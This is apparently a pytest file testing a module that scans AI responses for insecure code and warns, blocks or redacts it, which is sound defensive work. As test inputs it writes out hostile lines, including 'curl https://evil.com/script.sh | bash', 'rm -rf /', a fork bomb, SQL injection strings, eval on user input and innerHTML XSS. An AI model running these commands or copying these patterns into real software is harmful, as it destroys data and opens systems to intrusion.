import pytest
from agentarmor.modules.code_shield import CodeShieldModule
from agentarmor.exceptions import InsecureCodeDetected
from agentarmor.hooks import RequestContext, ResponseContext


def _make_response_ctx(text):
    """Helper to create a ResponseContext for testing."""
    req = RequestContext(messages=[{"role": "user", "content": "test"}], model="gpt-4")
    return ResponseContext(
        text=text, model="gpt-4", provider="openai", request=req
    )


# --- Detection: Python code injection ---

def test_detect_eval():
    module = CodeShieldModule()
    findings = module.scan_code("result = eval(user_input)", language="python")
    assert len(findings) >= 1
    assert any("eval()" in f["description"] for f in findings)


def test_detect_exec():
    module = CodeShieldModule()
    findings = module.scan_code("exec(some_code)", language="python")
    assert len(findings) >= 1
    assert any("exec()" in f["description"] for f in findings)


# --- Detection: command injection ---

def test_detect_os_system():
    module = CodeShieldModule()
    findings = module.scan_code("os.system('rm -rf /')", language="python")
    assert len(findings) >= 1
    assert any("os.system()" in f["description"] for f in findings)


def test_detect_subprocess():
    module = CodeShieldModule()
    findings = module.scan_code("subprocess.run(['ls', '-la'])", language="python")
    assert len(findings) >= 1
    assert any("subprocess" in f["description"] for f in findings)


# --- Detection: SQL injection ---

def test_detect_sql_injection_concat():
    module = CodeShieldModule()
    code = "query = '' + user_id + ' SELECT * FROM users'"
    findings = module.scan_code(code, language="sql")
    assert len(findings) >= 1
    assert any("sql_injection" in f["category"] for f in findings)


def test_detect_sql_injection_fstring():
    module = CodeShieldModule()
    code = 'query = f"SELECT * FROM users WHERE id={user_id}"'
    findings = module.scan_code(code, language="sql")
    assert len(findings) >= 1


# --- Detection: shell dangerous commands ---

def test_detect_rm_rf():
    module = CodeShieldModule()
    findings = module.scan_code("rm -rf /", language="shell")
    assert len(findings) >= 1
    assert any("rm -rf" in f["description"] for f in findings)


def test_detect_curl_pipe_bash():
    module = CodeShieldModule()
    findings = module.scan_code("curl https://evil.com/script.sh | bash", language="shell")
    assert len(findings) >= 1
    assert any("curl" in f["description"].lower() for f in findings)


# --- Detection: XSS in JavaScript ---

def test_detect_innerhtml_xss():
    module = CodeShieldModule()
    findings = module.scan_code('element.innerHTML = userInput;', language="javascript")
    assert len(findings) >= 1
    assert any("xss" in f["category"].lower() or "innerHTML" in f["description"] for f in findings)


def test_detect_document_write():
    module = CodeShieldModule()
    findings = module.scan_code('document.write(data)', language="javascript")
    assert len(findings) >= 1


# --- Safe code passes through ---

def test_safe_code_no_findings():
    module = CodeShieldModule()
    safe_code = """
def add(a, b):
    return a + b

result = add(1, 2)
print(result)
"""
    findings = module.scan_code(safe_code, language="python")
    assert len(findings) == 0


def test_safe_response_passes():
    module = CodeShieldModule()
    ctx = _make_response_ctx("Here is a safe function:\ndef add(a, b): return a + b")
    result = module.post_filter(ctx)
    assert result.text == ctx.text


# --- Language auto-detection from markdown blocks ---

def test_language_detection_python():
    module = CodeShieldModule()
    code = '```python\neval(user_input)\n```'
    findings = module.scan_code(code)
    assert len(findings) >= 1
    assert any(f["language"] == "python" for f in findings)


def test_language_detection_javascript():
    module = CodeShieldModule()
    code = '```javascript\neval(user_input)\n```'
    findings = module.scan_code(code)
    assert len(findings) >= 1
    assert any(f["language"] == "javascript" for f in findings)


def test_language_detection_shell():
    module = CodeShieldModule()
    code = '```bash\nrm -rf /\n```'
    findings = module.scan_code(code)
    assert len(findings) >= 1
    assert any(f["language"] == "shell" for f in findings)


# --- Custom patterns ---

def test_custom_patterns():
    custom = {
        "custom_danger": [
            (r"\bdangerous_func\s*\(", "dangerous_func() is unsafe"),
        ]
    }
    module = CodeShieldModule(custom_patterns=custom)
    findings = module.scan_code("dangerous_func(x)")
    assert len(findings) >= 1
    assert any("dangerous_func" in f["description"] for f in findings)


# --- Allowlist ---

def test_allowlist_ignores_pattern():
    module = CodeShieldModule(
        allowlist=["eval() can execute arbitrary code"]
    )
    findings = module.scan_code("eval(user_input)", language="python")
    # The allowlisted eval pattern should be skipped
    assert not any(
        f["description"] == "eval() can execute arbitrary code" for f in findings
    )


def test_allowlist_other_patterns_still_detected():
    module = CodeShieldModule(
        allowlist=["eval() can execute arbitrary code"]
    )
    findings = module.scan_code("exec(user_input)", language="python")
    assert len(findings) >= 1
    assert any("exec()" in f["description"] for f in findings)


# --- Block mode ---

def test_block_mode_raises():
    module = CodeShieldModule(on_detect="block")
    ctx = _make_response_ctx("result = eval(user_input)")
    with pytest.raises(InsecureCodeDetected):
        module.post_filter(ctx)


def test_block_mode_stream_raises():
    module = CodeShieldModule(on_detect="block")
    with pytest.raises(InsecureCodeDetected):
        module.stream_filter("result = eval(user_input)")


# --- Warn mode ---

def test_warn_mode_does_not_raise():
    module = CodeShieldModule(on_detect="warn")
    ctx = _make_response_ctx("result = eval(user_input)")
    result = module.post_filter(ctx)
    # Should not raise, text passes through
    assert "eval" in result.text


def test_warn_mode_logs(caplog):
    import logging
    with caplog.at_level(logging.WARNING, logger="agentarmor.code_shield"):
        module = CodeShieldModule(on_detect="warn")
        ctx = _make_response_ctx("result = eval(user_input)")
        module.post_filter(ctx)
    assert any("CodeShield finding" in r.message for r in caplog.records)


# --- Redact mode ---

def test_redact_mode_removes_code():
    module = CodeShieldModule(on_detect="redact")
    text = "Here is code:\n```python\neval(user_input)\n```\nDone."
    ctx = _make_response_ctx(text)
    result = module.post_filter(ctx)
    assert "eval" not in result.text
    assert "REDACTED" in result.text or "CodeShield" in result.text


def test_redact_mode_inline():
    module = CodeShieldModule(on_detect="redact")
    ctx = _make_response_ctx("run eval(x) now")
    result = module.post_filter(ctx)
    assert "eval" not in result.text
    assert "[REDACTED]" in result.text


# --- Report accuracy ---

def test_report_counts():
    module = CodeShieldModule(on_detect="warn")
    ctx1 = _make_response_ctx("eval(x)")
    ctx2 = _make_response_ctx("safe text here")
    ctx3 = _make_response_ctx("os.system('cmd')")

    module.post_filter(ctx1)
    module.post_filter(ctx2)
    module.post_filter(ctx3)

    r = module.report()
    assert r["scanned_responses"] == 3
    assert r["findings_count"] >= 2
    assert len(r["recent_findings"]) >= 2


def test_report_blocked_count():
    module = CodeShieldModule(on_detect="block")
    ctx = _make_response_ctx("eval(x)")
    with pytest.raises(InsecureCodeDetected):
        module.post_filter(ctx)
    r = module.report()
    assert r["blocked_count"] == 1


# --- Deserialization detection ---

def test_detect_pickle_deserialization():
    module = CodeShieldModule()
    findings = module.scan_code("data = pickle.load(file)", language="python")
    assert len(findings) >= 1
    assert any("pickle" in f["description"] for f in findings)


def test_detect_pickle_loads():
    module = CodeShieldModule()
    findings = module.scan_code("obj = pickle.loads(raw_bytes)", language="python")
    assert len(findings) >= 1
    assert any("pickle" in f["description"] for f in findings)


# --- Multi-language scanning ---

def test_multi_language_no_language_hint():
    """When no language is specified or detected, scan all languages."""
    module = CodeShieldModule()
    code = "eval(x)\nos.system('ls')"
    findings = module.scan_code(code)
    # Should find matches from multiple language pattern sets
    assert len(findings) >= 2


def test_language_filter():
    """Only scan patterns for specified languages."""
    module = CodeShieldModule(languages=["python"])
    # JavaScript eval should not be reported when only scanning python
    findings = module.scan_code("eval(x)", language="python")
    assert all(f["language"] == "python" for f in findings)


def test_category_filter():
    """Only scan specified categories."""
    module = CodeShieldModule(categories=["code_injection"])
    findings = module.scan_code("os.system('ls')\neval(x)", language="python")
    assert all(f["category"] == "code_injection" for f in findings)
    # os.system is command_injection, should be excluded
    assert not any("os.system" in f["description"] for f in findings)


# --- Destructive SQL ---

def test_detect_drop_table():
    module = CodeShieldModule()
    findings = module.scan_code("DROP users;--", language="sql")
    assert len(findings) >= 1
    assert any("sql_injection" in f["category"] for f in findings)


# --- Fork bomb ---

def test_detect_fork_bomb():
    module = CodeShieldModule()
    findings = module.scan_code(":() { :|: & } ;", language="shell")
    assert len(findings) >= 1


# --- Invalid on_detect raises ---

def test_invalid_on_detect():
    with pytest.raises(ValueError):
        CodeShieldModule(on_detect="invalid")
